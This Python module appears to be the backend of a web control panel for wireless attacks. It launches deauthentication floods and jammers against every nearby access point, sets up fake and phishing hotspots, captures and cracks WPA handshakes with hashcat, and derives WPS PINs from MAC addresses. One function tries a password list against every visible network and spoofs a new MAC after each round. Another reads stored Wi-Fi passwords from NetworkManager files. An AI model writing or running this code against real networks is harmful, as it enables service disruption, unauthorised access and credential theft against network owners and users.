import subprocess

from . import *

__all__ = ['network_manager_read_change_conf', 'change_mac', 'set_tcpdump_eapol',
           'network_manager_start_stop', 'get_network_manager_status', 'get_ls',
           'get_ps_uptime', 'connecting_wifi', 'get_networks', 'get_ifconfig',
           'get_iwconfig_hciconfig', 'change_power', 'get_airmon_check',
           'free_port', 'set_airmon_check_kill', 'set_airmon_mode_monitor',
           'set_airodump', 'set_hcxdumptool', 'set_mode_managed', 'get_pids',
           'get_iw_list', 'get_iwlist_scan', 'get_iw_wlan_info', 'set_wifite',
           'set_wlan_mode_monitor', 'set_wlan_set_type_monitor', 'set_fake_ap',
           'set_add_mon_type_monitor', 'get_iw_dev_info', 'get_ip',
           'set_del_mon_interface', 'set_hcxpcapngtool', 'set_aireplay_inject',
           'set_wpa_supplicant_start_stop', 'set_tshark_wlan_beacon',
           'set_sniffer', 'get_wpa_supplicant_status', 'set_hashcat_mask',
           'get_mac_to_wpspin', 'get_name_to_mac', 'get_iwlist_wlan_scan_ssid',
           'set_mdk3_fake_ap', 'set_airbase_fake_ap', 'get_route_netstat',
           'set_mdk4_deauthentication', 'change_channel', 'set_hashcat_dict',
           'set_aireplay_deauthentication', 'set_pyrit_striplive', 'set_horst',
           'set_kismet', 'set_airoscapy', 'start_http_server', 'set_waidps',
           'set_del_tempfiles', 'get_rfkill_list', 'get_lspci_lsusb',
           'set_tshark', 'set_wireshark', 'set_airgeddon', 'set_wifiphisher',
           'get_iwlist_channel', 'get_iw_dev_wlan_link', 'connecting_aps_wifi',
           'set_scapy_lan_scan', 'set_fluxion', 'get_cat_proc_net_dev',
           'set_wifijammer',  'get_iw_reg_get', 'set_add_wlanXmon_type_monitor',
           'get_ls_sys_class_net', 'set_create_ap', 'connecting_aps',
           'get_system_connections', 'set_airodump_manufacturer_uptime_wps',
           'get_dmesg_wlan', 'set_airodump_channel_36_177', 'set_tcpdump_pnl',
           'set_scapy_beacon', 'set_scapy_deauthentication', 'set_scapy_scan']

FINISH = "<h2><font color='red'>FINISH</font></h2>"
NOT_FOUND = "<h2><font color='red'>NOT FOUND</font></h2>"


def get_html(colour: str, result) -> str:
    return f"<h2><font color='{colour}'><pre>{result}</pre></font></h2>"


def model(cmd, arg):
    args: List[str] = request.args.getlist(arg)
    clean = [shlex.quote(i) for i in args]
    full_command = shlex.split(f"{cmd} {''.join(clean)}")
    result = subprocess.run(full_command, capture_output=True).stdout.decode()
    return result


def set_new_mac():
    source = list(map(lambda x: "%02x".upper() % int(random() * 0xFF), range(5)))
    new_mac = "00:" + ':'.join(source)
    return new_mac


def change_mac(mac):
    if 'monitor' in get_iw_wlan_info():
        msg = ("<h2><font color='red'><p>Fail !!!</p></font>"
               f"{WLAN} interface mode <font color='red'>monitor</font>.<p>"
               "Change mode to <font color='green'>managed</font></p></h2>")
        return msg
    cmd = [f"ifconfig {WLAN} down",
           f"ifconfig {WLAN} hw ether {mac}",
           f"ifconfig {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return "<h2>mac address <font color='green'>changed</h2></font>"


def change_power():
    cmd = [f"ifconfig {WLAN} down",
           "iw reg set BZ",
           f"iw dev {WLAN} set txpower fixed 3000",
           f"ifconfig {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return f"<h2>txpower {WLAN} <font color='green'>changed</h2></font>"


def change_channel(ch):
    message = ("<h2>Set channel from <font color='brown'>1</font> to "
               "<font color='brown'>14</font> for <font color='green'>"
               "2.4</font>GHz.</h2>")
    output = subprocess.getoutput(f'iwlist {WLAN} channel | grep "5.7 GHz"')
    if output:
        message += ("<h2><p>Set channel from <font color='brown'>36"
                    "</font> to <font color='brown'>64 </font>and from "
                    "<font color='brown'>100</font> to <font color='brown'>177"
                    "</font> for <font color='green'>5.8</font>GHz.</p></h2>")
    if str(ch).isdigit():
        low = 0 < int(ch) < 15
        middle = 35 < int(ch) < 65
        high = 99 < int(ch) < 178
        if low or middle or high:
            cmd = f"iwconfig {WLAN} channel {ch}"
            subprocess.call(cmd, shell=True)
            return (f"<h2>channel {WLAN} <font color='green'>changed </font>on "
                    f"<font color='red'>{ch}</font></h2>")
    return message


def network_manager_start_stop(action):
    if not action:
        cmd = 'service NetworkManager stop'
        subprocess.run(cmd, shell=True)
        return "<h2>NetworkManager <font color='red'>stopped</h2></font>"
    cmd = 'service NetworkManager start'
    subprocess.run(cmd, shell=True)
    return "<h2>NetworkManager <font color='green'>started</h2></font>"


def get_network_manager_status():
    cmd = 'service NetworkManager status'
    return model(cmd=cmd, arg='')


def mac_address_config(text):
    with open('/etc/NetworkManager/conf.d/mac.conf', 'w') as mac:
        mac.write(text)
    restart = 'systemctl restart NetworkManager'
    subprocess.run(restart, shell=True)
    result = '<h2><p><font color="green">OK</font></p>'
    cat = 'cat /etc/NetworkManager/conf.d/mac.conf'
    name = f'<b><font color="blue">***** {cat[4:]} *****</font></b><p><pre>'
    result += name + model(cmd=cat, arg='') + '</pre></p></h2>'
    return result


def network_manager_read_change_conf(var):
    variable = {'not-random': '[device]\nwifi.scan-rand-mac-address=no',
                'random': '[connection]\nethernet.cloned-mac-address=random'
                          '\nwifi.cloned-mac-address=random',
                'stable': '[connection]\nethernet.cloned-mac-address=stable'
                          '\nwifi.cloned-mac-address=stable'}
    result = (f'<h2>Example:<p><a href="/NetworkManager_read_or_change_conf'
              f'/random">random</a> - generate random mac address '
              f'({variable["random"][48:]})</p><p><a href="/NetworkManager_'
              f'read_or_change_conf/not-random">not-random</a> - not generate '
              f'random mac address ({variable["not-random"][9:]})</p><p>'
              f'<a href="/NetworkManager_read_or_change_conf/stable">stable'
              f'</a> - stable mac address ({variable["stable"][48:]})</p>')
    if var == '<choice>':
        cmd = 'cat /etc/NetworkManager/NetworkManager.conf'
        name = f'<b><font color="blue">***** {cmd[4:]} *****</font></b><p><pre>'
        result += name + model(cmd=cmd, arg='') + '</pre></p></h2>'
        if Path('/etc/NetworkManager/conf.d/mac.conf').exists():
            cmd = 'cat /etc/NetworkManager/conf.d/mac.conf'
            name = (f'<h2><b><font color="blue">***** {cmd[4:]} *****</font>'
                    f'</b><p><pre>')
            result += name + model(cmd=cmd, arg='') + '</pre></p></h2>'
        elif not Path('/etc/NetworkManager/conf.d/mac.conf').exists():
            if not Path('/etc/NetworkManager/conf.d').exists():
                cmd = ['mkdir /etc/NetworkManager/conf.d',
                       'touch /etc/NetworkManager/conf.d/mac.conf']
                [subprocess.run(i, shell=True) for i in cmd]
            else:
                cmd = 'touch /etc/NetworkManager/conf.d/mac.conf'
                subprocess.run(cmd, shell=True)
        return result
    elif var in variable:
        result = mac_address_config(variable[var])
    return result


def set_wpa_supplicant_start_stop(action):
    if not action:
        if 'running' in get_network_manager_status()[135:163]:
            return ("<h2><font color='red'>First you need to stop service "
                    "</font>NetworkManager</h2>")
        cmd = 'systemctl stop wpa_supplicant.service'
        subprocess.run(cmd, shell=True)
        return "<h2>wpa supplicant <font color='red'>stopped</font></h2>"
    cmd = 'systemctl start wpa_supplicant.service'
    subprocess.run(cmd, shell=True)
    return "<h2>wpa supplicant <font color='green'>started</font></h2>"


def get_wpa_supplicant_status():
    cmd = 'systemctl status wpa_supplicant.service'
    return model(cmd=cmd, arg='')


def get_airmon_check():
    result = model(cmd='airmon-ng', arg='check')
    return get_html('black', result)


def set_airmon_check_kill():
    cmd = 'airmon-ng check kill'
    result = model(cmd=cmd, arg='')
    return get_html('black', result)


def set_airmon_mode_monitor():
    cmd = f'airmon-ng start {WLAN}'
    model(cmd=cmd, arg='')
    return FINISH


def set_wlan_mode_monitor():
    cmd = [f"ifconfig {WLAN} down",
           f"iwconfig {WLAN} mode monitor",
           f"ifconfig {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return f"<h2>{WLAN} mode changed to <font color='red'>monitor</font></h2>"


def set_wlan_set_type_monitor():
    cmd = [f"ip link set {WLAN} down",
           f"iw dev {WLAN} set type monitor",
           f"ip link set {WLAN} up"]
    [subprocess.call(i, shell=True) for i in cmd]
    return f"<h2>{WLAN} mode changed to <font color='red'>monitor</font></h2>"


def set_add_mon_type_monitor():
    cmd = f"iw {WLAN} interface add {MON} type monitor"
    subprocess.call(cmd, shell=True)
    return f"<h2>{WLAN} added mon mode <font color='red'>monitor</font></h2>"
    
    
def set_add_wlanXmon_type_monitor():
    cmd = f"iw {WLAN} interface add {WLAN}mon type monitor"
    subprocess.call(cmd, shell=True)
    return f"<h2>{WLAN} added {WLAN}mon mode <font color='red'>monitor</font></h2>"


def get_phy():
    result = []
    cmd = 'iwconfig'
    out = subprocess.getoutput(cmd).split('\n')
    for i in out:
        if 'IEEE' in i:
            result.append(i.split('IEEE')[0].strip())
    return result


def set_mode_managed():
    phy = get_phy()
    for i in ['wlan0mon', 'wlan1mon', 'wlan2mon']:
        if i in phy:
            cmd = [f"ifconfig {i} down",
                   f"iw dev {i} set type managed",
                   f"ifconfig {i} up"]
            [subprocess.call(k, shell=True) for k in cmd]
        if phy.count(i[:-3]) < 2:
            cmd = f"iw {i} interface add {i[:-3]} type managed"
            subprocess.call(cmd, shell=True)
    for i in ['wlan0', 'wlan1', 'wlan2']:
        if i in phy:
            cmd = [f"ifconfig {i} down",
                   f"iw dev {i} set type managed",
                   f"ifconfig {i} up"]
            [subprocess.call(k, shell=True) for k in cmd]
    return "<h2>wlan mode changed to <font color='green'>managed</font></h2>"


def set_del_mon_interface():
    set_mode_managed()
    phy = get_phy()
    for i in [MON, 'wlan0mon', 'wlan1mon', 'wlan2mon']:
        if i in phy:
            cmd = f"iw dev {i} del"
            subprocess.call(cmd, shell=True)
    for i in phy:
        if i not in ['wlan0', 'wlan1', 'wlan2']:
            cmd = f"iw dev {i} del"
            subprocess.call(cmd, shell=True)
    return "<h2>virtual interface <font color='red'>delete</font></h2>"


def set_del_tempfiles(path, ext):
    for i in ext:
        files = Path(path).glob(f"*.{i}")
        [Path(file).unlink() for file in files]
    kismet_files = Path().cwd().glob(f'*.{ext[0]}')
    for file in kismet_files:
        Path(file).unlink()
    return "<h2><font color='red'>remove </font>tempfiles</h2>"


def set_airodump():
    getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
    if f'{WLAN}' and 'type monitor' not in getout:
        set_mode_managed()
        set_wlan_set_type_monitor()
    cmd = (f"gnome-terminal --tab -- bash -c "
           f"'airodump-ng {WLAN} -w {DUMP[:-5]}'")
    model(cmd=cmd, arg='')
    return FINISH


def set_airodump_channel_36_177():
    getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
    if f'{WLAN}' and 'type monitor' not in getout:
        set_mode_managed()
        set_wlan_set_type_monitor()
    cmd = (f"gnome-terminal --tab -- bash -c "
           f"'airodump-ng --channel 36-177 {WLAN}'")
    model(cmd=cmd, arg='')
    return FINISH


def set_airodump_manufacturer_uptime_wps():
    getout = subprocess.getoutput(f'iw {WLAN} info')[10:90]
    if f'{WLAN}' and 'type monitor' not in getout:
        set_mode_managed()
        set_wlan_set_type_monitor()
    cmd = (f"gnome-terminal --tab -- bash -c "
           f"'airodump-ng {WLAN} --manufacturer --uptime --wps'")
    model(cmd=cmd, arg='')
    return FINISH


def set_airbase_fake_ap():
    set_add_mon_type_monitor()
    cmd = f"xterm -e airbase-ng -a 44:E9:DD:27:D8:F6 -e FREE -c 10 -Z 4 {MON}"
    result = model(cmd=cmd, arg='')
    return get_html('black', result)


def set_mdk3_fake_ap():
    set_add_mon_type_monitor()
    cmd = f"xterm -e mdk3 {MON} b -v {FAKE_APS} -g -m"
    # cmd = f"xterm -e mdk3 {MON} b -n 'FREE WIFI' -g -t 00:1E:20:36:24:3C -m -c 11"
    model(cmd=cmd, arg='')
    return FINISH


def set_scapy_beacon():
    cmd = f"xterm -e python3 {BEACON} {WLAN} MyFreeWifi"
    model(cmd=cmd, arg='')
    return FINISH


def set_mdk4_deauthentication():
    cmd = f"xterm -e mdk3 {WLAN} d -c"
    model(cmd=cmd, arg='')
    return FINISH


def set_aireplay_deauthentication():
    mac = get_iwlist_wlan_scan_mac()
    # cmd = f"xterm -e aireplay-ng -0 0 -D {WLAN}"
    [model(cmd=f"xterm -e aireplay-ng -0 5 -a {i} {WLAN}", arg='') for i in mac]
    return FINISH


def set_scapy_deauthentication():
    model(cmd=f"xterm -e python3 {DEAUTH} {WLAN}", arg='')
    return FINISH


def set_aireplay_inject():
    set_wlan_mode_monitor()
    cmd = f"gnome-terminal --tab -- bash -c 'aireplay-ng -9 {WLAN}'"
    model(cmd=cmd, arg='')
    return FINISH


def set_wifite():
    cmd = "gnome-terminal --tab -- bash -c 'wifite --reaver'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_wifiphisher():
    cmd = "gnome-terminal --tab -- bash -c 'wifiphisher'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_waidps():
    set_del_mon_interface()
    set_wlan_mode_monitor()
    cmd = f"gnome-terminal --tab -- bash -c 'python2 {WAIDPS} -i {WLAN}'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_wifijammer():
    set_wlan_mode_monitor()
    cmd = f"gnome-terminal --tab -- bash -c 'python2 {WIFIJAMMER}'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_fake_ap():
    cmd = f"gnome-terminal --tab -- bash -c 'python2 {FAKEAP} -c 1 -e 'FREE*WIFI''"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_fluxion():
    cmd = f"gnome-terminal --tab -- bash -c 'cd {FLUXION} && ./fluxion.sh'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_pyrit_striplive():
    set_mode_managed()
    set_wlan_mode_monitor()
    cmd = f"gnome-terminal --tab -- bash -c 'pyrit -r {WLAN} -o {DUMP} stripLive'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_airgeddon():
    cmd = "gnome-terminal --tab -- bash -c 'airgeddon'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_hcxdumptool():
    set_del_mon_interface()
    cmd = f"gnome-terminal --tab -- bash -c '{PATH} -i {WLAN} -w {DUMP}'"
    # cmd = f'xterm -e hcxdumptool -i {WLAN} -o {DUMP} --enable_status=2'
    # subprocess.call(cmd, shell=True)
    subprocess.run(cmd, shell=True)
    return FINISH


def set_hcxpcapngtool():
    result = output = ''
    if not Path(DUMP).exists() and Path(DUMP[:-5] + '-01.cap').exists():
        Path(DUMP[:-5] + '-01.cap').rename(DUMP)
    if Path(DUMP).exists():
        cmd = f'hcxpcapngtool -o {HASH} -E {AP_ST_LIST} {DUMP}'
        output = model(cmd=cmd, arg='')
    if Path(HASH).exists():
        hashes = model(cmd=f'cat {HASH}', arg='')
        data = []
        with open(HASH, 'r') as text:
            for line in text:
                data.append(line.split('*'))
        ap = '<p>List of found routers:</p><ul>'
        for item in data:
            word = bytes.fromhex(item[5]).decode()
            ap += f'<li>{word}</li>'
        result += (f"<h2>{hashes}<font color='green'>{ap}</font></ul>"
                   f"<p><pre>{output}</pre></h2></p>")
        Path(HASH).rename(HASH[:-10] + 'old_' + HASH[-10:])
        return result
    return NOT_FOUND


def set_hashcat_mask():
    cmd = (f"gnome-terminal --tab -- bash -c 'hashcat -m 22000 {HASH} "
           f"-a 3 ?d?d?d?d?d?d?d?d'")
    subprocess.run(cmd, shell=True)
    return FINISH


def set_hashcat_dict():
    cmd = (f"gnome-terminal --tab -- bash -c 'hashcat -m 22000 "
           f"{HASH} {DICTIONARY}'")
    subprocess.run(cmd, shell=True)
    return FINISH


def set_kismet():
    cmd = "xterm -e kismet"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_horst():
    set_wlan_set_type_monitor()
    cmd = f"gnome-terminal --tab -- bash -c 'horst -i {WLAN}'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_tshark():
    if Path(DUMP).exists():
        cmd = (f'tshark -r {DUMP} -Y "wlan.fc.type_subtype == 0x08 '
               f'|| wlan.fc.type_subtype == 0x04 || eapol"')
        result = model(cmd=cmd, arg='')
        return get_html('blue', result)
    return NOT_FOUND


def set_wireshark():
    if Path(DUMP).exists():
        cmd = (f'wireshark -r {DUMP} -Y "wlan.fc.type_subtype == 0x08 '
               f'|| wlan.fc.type_subtype == 0x04 || eapol"')
        subprocess.run(cmd, shell=True)
        return FINISH
    return NOT_FOUND


def set_sniffer():
    set_wlan_mode_monitor()
    cmd = (f"gnome-terminal --window -- bash -c "
           f"'python2 functions/sniffer.py -i {WLAN}'")
    subprocess.run(cmd, shell=True)
    return FINISH


def set_airoscapy():
    set_wlan_mode_monitor()
    cmd = (f"gnome-terminal --window -- bash -c "
           f"'python2 functions/airoscapy.py {WLAN}'")
    subprocess.run(cmd, shell=True)
    return FINISH


def set_tshark_wlan_beacon():
    set_wlan_mode_monitor()
    cmd = (f"gnome-terminal --window -- bash -c "
           f"'tshark -i {WLAN} | grep Beacon --colour'")
    subprocess.run(cmd, shell=True)
    return FINISH


def set_tcpdump_pnl():
    set_wlan_mode_monitor()
    cmd = f"gnome-terminal --window -- bash -c '{PNL}'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_tcpdump_eapol():
    set_wlan_mode_monitor()
    cmd = (f"gnome-terminal --window -- bash -c "
           f"'tcpdump -i {WLAN} | grep EAPOL --colour'")
    subprocess.run(cmd, shell=True)
    return FINISH


def set_scapy_scan():
    set_wlan_mode_monitor()
    cmd = f"gnome-terminal --window -- bash -c 'python3 {SCAN} {WLAN}'"
    subprocess.run(cmd, shell=True)
    return FINISH


def set_scapy_lan_scan():
    cmd = "python3 functions/scapy-wifi-scan.py"
    result = subprocess.getoutput(cmd)
    if result:
        return get_html('blue', result)
    return NOT_FOUND


def get_mac_to_wpspin(mac: str) -> str:
    one = two = (int(mac, 16) & 0xFFFFFF) % 10000000
    var1 = 0
    while two:
        var1 += 3 * (two % 10)
        two = floor(two / 10)
        var1 += two % 10
        two = floor(two / 10)
    var2 = (one * 10) + ((10 - (var1 % 10)) % 10)
    var3 = str(int(var2))
    wpspin = var3.zfill(8)
    return wpspin


def get_name_to_mac(name) -> str:
    result = model(cmd="iwlist scan", arg='')
    ap = ''
    for cell in result.split('Cell'):
        if name in cell[210:263]:
            ap += f'<pre>{cell[:263]}</pre>'
    if not ap:
        return NOT_FOUND
    return get_html('blue', ap)


def get_ifconfig() -> str:
    command = "ifconfig"
    result = subprocess.run(command, capture_output=True).stdout.decode()
    return get_html('blue', result)


def get_ip() -> str:
    cmd = "ip a"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_iw_dev_wlan_link() -> str:
    wlan = get_phy()
    result = '<b>***** iw dev wlan link *****</b>'
    for i in wlan:
        cmd = f"iw dev {i} link"
        result += '<p>' + model(cmd=cmd, arg='') + '</p>'
    cmd = 'nmcli dev status'
    result += f'<b>***** {cmd} *****</b><p>' + model(cmd=cmd, arg='') + '</p>'
    return get_html('blue', result)


def get_lspci_lsusb() -> str:
    result = ''
    cmd = ["lspci", "lsusb"]
    for i in cmd:
        result += f'<b>***** {i} *****</b><p>' + model(cmd=i, arg='') + '</p>'
    return get_html('blue', result)


def get_rfkill_list() -> str:
    cmd = "rfkill list all"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)
    
    
def get_iw_reg_get() -> str:
    cmd = "iw reg get"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_iwconfig_hciconfig() -> str:
    result = ''
    cmd = ["iwconfig", "hciconfig -a"]
    for i in cmd:
        result += f'<b>***** {i} *****</b><p>' + model(cmd=i, arg='') + '</p>'
    return get_html('blue', result)


def get_route_netstat() -> str:
    try:
        cmd = "ip -h -br a | grep UP"
        sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
        result = '\n'.join(sys.stdout.split('\n'))
        result = f'<b>***** {cmd} *****</b><p>' + result + '</p>'
    except subprocess.CalledProcessError:
        result = ''
    cmd = ["curl https://api.ipify.org", "ip route", "netstat -ntu"]
    for i in cmd:
        result += f'<b>***** {i} *****</b><p>' + model(cmd=i, arg='') + '</p>'
    return get_html('blue', result)


def get_iwlist_scan() -> str:
    cmd = "iwlist scan"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_iw_list() -> str:
    cmd = "iw list"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_iwlist_wlan_scan_ssid() -> str:
    set_mode_managed()
    cmd = "iwlist scan | grep ESSID"
    sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
    output = '\n'.join(sys.stdout.split('\n'))
    return get_html('blue', output)


def get_iwlist_wlan_scan_mac() -> set:
    set_mode_managed()
    cmd = "iwlist scan | grep Address"
    sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
    output = set([i.strip() for i in sys.stdout.split(' ') if '\n' in i])
    return output


def get_iw_wlan_info() -> str:
    cmd = f"iw {WLAN} info"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_iw_dev_info() -> str:
    cmd = "iw dev"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_iwlist_channel() -> str:
    cmd = "iwlist channel"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_cat_proc_net_dev() -> str:
    cmd = "cat /proc/net/dev"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_ls_sys_class_net() -> str:
    cmd = "ls -l /sys/class/net"
    result = model(cmd=cmd, arg='')
    return get_html('blue', result)


def get_networks() -> str:
    cmd = "nmcli dev wifi"
    result = model(cmd=cmd, arg='con')
    return get_html('purple', result)


def connecting_wifi() -> str:
    cmd = f"nmcli dev wifi con '{AP}' password {PASS}"
    result = model(cmd=cmd, arg='')
    return get_html('green', result)


def connecting_aps_wifi() -> str:
    for ap, passwd in AP_PASS.items():
        cmd = f"nmcli dev wifi con '{ap}' password {passwd}"
        result = model(cmd=cmd, arg='')
        if result:
            return get_html('green', result)
    return "<h2><font color='red'>NOT CONNECTING</font></h2>"


def set_create_ap() -> str:
    cmd = (f"gnome-terminal --window -- bash -c "
           f"'create_ap {WLAN} eth0 MyAP password'")
    model(cmd=cmd, arg='')
    return FINISH


def start_http_server() -> str:
    cmd = "gnome-terminal --window -- bash -c 'python3 -m http.server 80'"
    result = model(cmd=cmd, arg='')
    return get_html('green', result)


def get_ps_uptime() -> str:
    stdout = sys.stdout
    cmd = 'uptime'
    sys.stdout = subprocess.check_output(cmd, shell=True).decode('utf-8').strip()
    output = [i for i in sys.stdout.split(' ')]
    sys.stdout = stdout
    uptime = f"<h2>Current uptime is <font color='blue'>{output[0]}</font></h2>"
    result = uptime + model(cmd="ps", arg='arg')
    return get_html('blue', result)


def get_ls() -> str:
    result = ''
    for i in ['.', 'functions', 'template', 'tempfiles']:
        cmd = f"ls -lia {i}"
        result += f'<b>***** {i} *****</b><p>' + model(cmd=cmd, arg='') + '</p>'
    return get_html('blue', result)


def get_pids(port: int) -> (List[int], List[str]):
    """ Returns a list of pid processes occupying the given port """
    pids: List[int] = []
    proc: List[str] = []
    cmd = f"lsof -i :{port}"
    args = shlex.split(cmd)
    output = subprocess.run(args, capture_output=True)
    result = str(output.stdout).split('\\n')[1:]
    [pids.append(int(i.split()[1])) for i in result if len(i) > 1]
    [proc.append(f'{i.split()[0]}: {int(i.split()[1])}')
     for i in result if len(i) > 1]
    return pids, proc


def free_port(port: int) -> None:
    """ Terminates processes occupying the given port """
    pids: List[int] = get_pids(port)[0]
    [kill(pid, signal.SIGINT) for pid in pids if pids]


def get_system_connections() -> str:
    result = ''
    cmd = ("grep psk= /etc/NetworkManager/system-connections/*",
           "nmcli -s connection show | grep wifi")
    for i in cmd:
        result += (f'<b>***** {i} *****</b><p>' + subprocess.getoutput(i) + '</p>')
        # [20:].replace('.nmconnection', '')
    return get_html('blue', result)


def get_dmesg_wlan() -> str:
    cmd = 'dmesg -J | grep wlan'
    result = (f'<b>***** {cmd} *****</b><p>' + subprocess.getoutput(cmd) + '</p>')
    return get_html('blue', result)


def get_list_essid():
    cmd = f"iwlist {WLAN} scan | grep ESSID"
    stdout = subprocess.getoutput(cmd)
    output = [i.strip().replace('"', '') for i in stdout.split('ESSID:')]
    [output.remove(i) for i in output if not i]
    return output


def connect_list_essid(ap_passwd):
    for ap, passwd in ap_passwd.items():
        cmd = f"nmcli dev wifi con '{ap}' password {passwd}"
        result = model(cmd=cmd, arg='')
        if result:
            return result
    return False


def connecting_aps() -> str:
    set_mode_managed()
    with open(DEFAULT_PASS, 'r') as password:
        passwd = password.read().split('\n')
    aps_list = get_list_essid()
    while passwd:
        ap_passwd = dict.fromkeys(aps_list, passwd.pop())
        result = connect_list_essid(ap_passwd)
        if result:
            return get_html('green', result)
        change_mac(set_new_mac())
    return "<h2><font color='red'>NOT CONNECTING</font></h2>"
